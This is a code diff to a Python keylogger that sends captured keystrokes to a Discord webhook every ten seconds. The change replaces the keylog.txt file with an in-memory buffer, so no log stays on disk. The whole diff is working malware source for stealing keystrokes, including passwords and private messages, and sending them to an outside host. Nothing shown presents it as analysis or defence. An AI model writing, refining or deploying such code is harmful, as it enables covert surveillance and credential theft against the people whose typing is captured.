@@ -8,13 +8,14 @@ import threading
 load_dotenv() # load the webhook url from .env file
 
 WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK')
+print("WEBHOOK_URL", WEBHOOK_URL)
 SEND_INTERVAL = 10
 
 caps_on = False
 shift_pressed = False
+keylog = ""
 
 valid_chars = string.ascii_letters + string.digits + string.punctuation
-
 
 def send_data_to_webhook(data):
     if not data.strip():
@@ -33,25 +34,16 @@ def send_data_to_webhook(data):
         print(f"Failed to send to Discord: {e}")
 
 def periodic_send():
+    global keylog
     threading.Timer(SEND_INTERVAL, periodic_send).start()
 
-    try:
-        if os.path.exists('keylog.txt'):
-            with open('keylog.txt', 'r+') as f:
-                data = f.read()
-                if data:
-                    send_data_to_webhook(data)
-                    f.truncate(0)
-                    f.seek(0)
-    except Exception as e:
-        print(f"Error reading or clearing log: {e}")
+    if keylog.strip():
+        send_data_to_webhook(keylog)
+        keylog = ""
 
 def write(char):
-    try:
-        with open("keylog.txt", "a") as f:
-            f.write(char)
-    except Exception as e:
-        print(e)
+    global keylog
+    keylog += char
 
 def on_press(key):
     global caps_on, shift_pressed
